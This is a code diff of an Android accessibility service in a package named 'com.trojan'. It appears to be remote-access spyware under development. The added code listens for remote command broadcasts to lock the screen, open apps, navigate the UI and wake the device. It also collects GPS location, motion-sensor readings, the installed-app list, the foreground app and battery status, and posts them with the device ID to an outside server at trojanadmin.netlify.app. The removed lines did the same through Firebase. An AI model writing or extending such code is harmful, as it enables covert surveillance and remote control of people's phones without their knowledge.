@@ -1,108 +1,127 @@
 package com.trojan;
 
 import android.accessibilityservice.AccessibilityService;
+import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.hardware.Sensor;
+import android.hardware.SensorEvent;
+import android.hardware.SensorEventListener;
+import android.hardware.SensorManager;
+import android.location.Location;
+import android.os.BatteryManager;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
-import java.util.HashMap;
-import java.util.Map;
+import android.view.accessibility.AccessibilityNodeInfo;
 
-public class PowerAccessibilityService extends AccessibilityService {
-    private static final String TAG = "PowerAccessibility";
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.toolbox.Volley;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
 
-    // --- Define all possible actions the service can perform ---
-    // These are the constants that were missing.
-    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.LOCK_SCREEN";
-    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.SHUTDOWN";
-    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.LIST_APPS";
-    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.OPEN_APP";
-    public static final String ACTION_TRIGGER_CLOSE_APP = "com.trojan.CLOSE_APP";
-    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.GET_CURRENT_APP";
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
-    private String lastForegroundApp = "";
+import java.util.List;
 
-    private final BroadcastReceiver commandReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if (intent == null || intent.getAction() == null) {
-                return;
-            }
-            String action = intent.getAction();
-            Log.d(TAG, "Received command: " + action);
+public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {
 
-            switch (action) {
-                case ACTION_TRIGGER_LOCK_SCREEN:
-                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
-                    break;
-                case ACTION_TRIGGER_SHUTDOWN:
-                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
-                    break;
-                case ACTION_TRIGGER_LIST_APPS:
-                    listInstalledApps();
-                    break;
-                case ACTION_TRIGGER_OPEN_APP:
-                    String packageNameToOpen = intent.getStringExtra("package_name");
-                    if (packageNameToOpen != null) {
-                        openApp(packageNameToOpen);
-                    }
-                    break;
-                case ACTION_TRIGGER_CLOSE_APP:
-                    performGlobalAction(GLOBAL_ACTION_BACK);
-                    break;
-                case ACTION_TRIGGER_GET_CURRENT_APP:
-                    reportCurrentApp();
-                    break;
-            }
-        }
-    };
+    private static final String TAG = "PowerService";
 
-    private void listInstalledApps() {
-        Log.d(TAG, "Listing installed applications...");
-        PackageManager pm = getPackageManager();
-        Map<String, String> appMap = new HashMap<>();
-        for (ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
-            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                String appName = pm.getApplicationLabel(app).toString();
-                String packageName = app.packageName;
-                appMap.put(packageName, appName);
-            }
-        }
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("installed_apps");
-        dbRef.setValue(appMap);
-        Log.d(TAG, "App list uploaded to Firebase.");
-    }
+    // --- Action strings for the broadcast receiver ---
+    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
+    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
+    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
+    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
+    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
+    // --- NEW ACTIONS ---
+    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
+    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
+    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
+    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
+    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
+    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
+    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
+    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
+    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
+    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
+    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";
 
-    private void openApp(String packageName) {
-        Log.d(TAG, "Attempting to open app: " + packageName);
-        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
-        if (launchIntent != null) {
-            startActivity(launchIntent);
-        } else {
-            Log.w(TAG, "Could not get launch intent for package: " + packageName);
-        }
-    }
+    // --- URL for submitting data back to the server ---
+    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
 
-    private void reportCurrentApp() {
-        Log.d(TAG, "Reporting current foreground app: " + lastForegroundApp);
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("current_app");
-        dbRef.setValue(lastForegroundApp);
+    private PowerActionReceiver powerActionReceiver;
+    private RequestQueue requestQueue;
+    private String lastForegroundAppPkg = "";
+
+    // --- New: For Location & Sensors ---
+    private FusedLocationProviderClient fusedLocationClient;
+    private SensorManager sensorManager;
+
+    // --- LIFECYCLE METHODS ---
+
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        Log.d(TAG, "Accessibility Service Connected.");
+        // Initialize components
+        requestQueue = Volley.newRequestQueue(this);
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
+
+        // Register the main command receiver
+        powerActionReceiver = new PowerActionReceiver();
+        IntentFilter filter = new IntentFilter();
+        // Add all actions to the filter
+        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN);
+        filter.addAction(ACTION_TRIGGER_SHUTDOWN);
+        filter.addAction(ACTION_TRIGGER_LIST_APPS);
+        filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
+        filter.addAction(ACTION_TRIGGER_OPEN_APP);
+        filter.addAction(ACTION_TRIGGER_NAV_BACK);
+        filter.addAction(ACTION_TRIGGER_NAV_HOME);
+        filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
+        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE);
+        filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
+        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH);
+        filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
+        filter.addAction(ACTION_TRIGGER_GET_LOCATION);
+        filter.addAction(ACTION_TRIGGER_GET_SENSORS);
+        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS);
+        filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
+
+        registerReceiver(powerActionReceiver, filter);
+        Log.d(TAG, "PowerActionReceiver registered for all actions.");
     }
 
     @Override
+    public boolean onUnbind(Intent intent) {
+        if (powerActionReceiver != null) {
+            unregisterReceiver(powerActionReceiver);
+        }
+        // Stop listening to sensors if we are
+        sensorManager.unregisterListener(this);
+        return super.onUnbind(intent);
+    }
+
+    // --- UPGRADED: Current App Detection ---
+    @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        // This is a much more reliable way to get the foreground app
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             if (event.getPackageName() != null && !event.getPackageName().toString().isEmpty()) {
-                lastForegroundApp = event.getPackageName().toString();
+                lastForegroundAppPkg = event.getPackageName().toString();
+                Log.d(TAG, "Foreground app changed to: " + lastForegroundAppPkg);
             }
         }
     }
@@ -110,24 +129,201 @@ public class PowerAccessibilityService extends AccessibilityService {
     @Override
     public void onInterrupt() {}
 
+    // --- BROADCAST RECEIVER ---
+    private class PowerActionReceiver extends BroadcastReceiver {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if (intent == null || intent.getAction() == null) return;
+            Log.d(TAG, "Received command: " + intent.getAction());
+
+            switch (intent.getAction()) {
+                // Global Actions
+                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
+                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
+                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
+                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
+                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
+
+                // App Management
+                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
+                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
+                case ACTION_TRIGGER_OPEN_APP:
+                    String packageToOpen = intent.getStringExtra("package_name");
+                    if (packageToOpen != null) openApp(packageToOpen);
+                    break;
+
+                // Device State
+                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpDevice(); break;
+                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
+                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
+
+                // Settings Toggles (Open Panels)
+                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.ACTION_WIFI_SETTINGS); break;
+                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
+                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
+
+                // Data Gathering
+                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
+                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
+            }
+        }
+    }
+
+    // --- ACTION IMPLEMENTATIONS ---
+
+    private void openApp(String packageName) {
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
+        if (launchIntent != null) {
+            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(launchIntent);
+        }
+    }
+    
+    @SuppressLint("WakelockTimeout")
+    private void wakeUpDevice() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm.isInteractive()) {
+            Log.d(TAG, "Screen is already on.");
+            return;
+        }
+        PowerManager.WakeLock wakeLock = pm.newWakeLock(
+            PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
+            "trojan::WakeLock"
+        );
+        wakeLock.acquire();
+        // Release the lock immediately to allow the screen to time out normally.
+        wakeLock.release();
+    }
+
+    private void openSettingsPanel(String settingsAction) {
+        Intent intent = new Intent(settingsAction);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+    }
+    
+    @SuppressLint("MissingPermission") // We assume permission is granted
+    private void getCurrentLocation() {
+        fusedLocationClient.getLastLocation()
+            .addOnSuccessListener(location -> {
+                if (location != null) {
+                    JSONObject locJson = new JSONObject();
+                    try {
+                        locJson.put("latitude", location.getLatitude());
+                        locJson.put("longitude", location.getLongitude());
+                        locJson.put("accuracy", location.getAccuracy());
+                        submitDataToServer("location", locJson);
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error creating location data", e);
+                    }
+                } else {
+                    submitDataToServer("location", "Location not available.");
+                }
+            });
+    }
+    
+    private void getSensorData() {
+        // We'll get one reading from the accelerometer and gyroscope and then unregister.
+        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
+        Sensor gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
+        
+        if (accelerometer != null) {
+            sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
+        }
+        if (gyroscope != null) {
+            sensorManager.registerListener(this, gyroscope, SensorManager.SENSOR_DELAY_NORMAL);
+        }
+    }
+    
     @Override
-    protected void onServiceConnected() {
-        super.onServiceConnected();
-        Log.d(TAG, "Accessibility Service connected and ready.");
-        IntentFilter filter = new IntentFilter();
-        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN);
-        filter.addAction(ACTION_TRIGGER_SHUTDOWN);
-        filter.addAction(ACTION_TRIGGER_LIST_APPS);
-        filter.addAction(ACTION_TRIGGER_OPEN_APP);
-        filter.addAction(ACTION_TRIGGER_CLOSE_APP);
-        filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
-        registerReceiver(commandReceiver, filter, Context.RECEIVER_EXPORTED);
+    public final void onSensorChanged(SensorEvent event) {
+        // This callback receives sensor data.
+        JSONObject sensorData = new JSONObject();
+        try {
+            sensorData.put("x", event.values[0]);
+            sensorData.put("y", event.values[1]);
+            sensorData.put("z", event.values[2]);
+            
+            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
+                submitDataToServer("accelerometer", sensorData);
+            } else if (event.sensor.getType() == Sensor.TYPE_GYROSCOPE) {
+                submitDataToServer("gyroscope", sensorData);
+            }
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error creating sensor data", e);
+        }
+        // IMPORTANT: Unregister the listener so we don't drain the battery.
+        sensorManager.unregisterListener(this);
     }
 
     @Override
-    public boolean onUnbind(Intent intent) {
-        unregisterReceiver(commandReceiver);
-        Log.d(TAG, "Accessibility Service disconnected.");
-        return super.onUnbind(intent);
+    public void onAccuracyChanged(Sensor sensor, int accuracy) {} // Can be ignored
+    
+    private void getScreenStatus() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
+    }
+    
+    private void getBatteryStatus() {
+        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent batteryStatus = registerReceiver(null, filter);
+        
+        if (batteryStatus != null) {
+            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            float batteryPct = level * 100 / (float) scale;
+            
+            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+            String isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL) ? "Yes" : "No";
+
+            try {
+                JSONObject batteryJson = new JSONObject();
+                batteryJson.put("percentage", batteryPct);
+                batteryJson.put("isCharging", isCharging);
+                submitDataToServer("battery_status", batteryJson);
+            } catch (JSONException e) {
+                Log.e(TAG, "JSON error creating battery data", e);
+            }
+        }
+    }
+    
+    private void getAndUploadAppList() {
+        PackageManager pm = getPackageManager();
+        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        JSONArray appArray = new JSONArray();
+
+        for (ApplicationInfo app : apps) {
+            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                try {
+                    JSONObject appJson = new JSONObject();
+                    appJson.put("appName", app.loadLabel(pm).toString());
+                    appJson.put("packageName", app.packageName);
+                    appArray.put(appJson);
+                } catch (JSONException e) {
+                    Log.e(TAG, "Error creating JSON for app", e);
+                }
+            }
+        }
+        submitDataToServer("app_list", appArray);
+    }
+
+    // --- GENERIC DATA SUBMISSION FUNCTION ---
+    private void submitDataToServer(String dataType, Object payload) {
+        JSONObject postData = new JSONObject();
+        try {
+            // Using the device's unique ID for tracking on the server log
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            postData.put("deviceId", deviceId);
+            postData.put("dataType", dataType);
+            postData.put("payload", payload);
+        } catch (JSONException e) {
+            Log.e(TAG, "Could not create submission JSON", e);
+            return;
+        }
+
+        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
+            response -> Log.d(TAG, "Data submitted successfully: " + dataType),
+            error -> Log.e(TAG, "Failed to submit data: " + error.toString())
+        );
+        requestQueue.add(request);
     }
 }
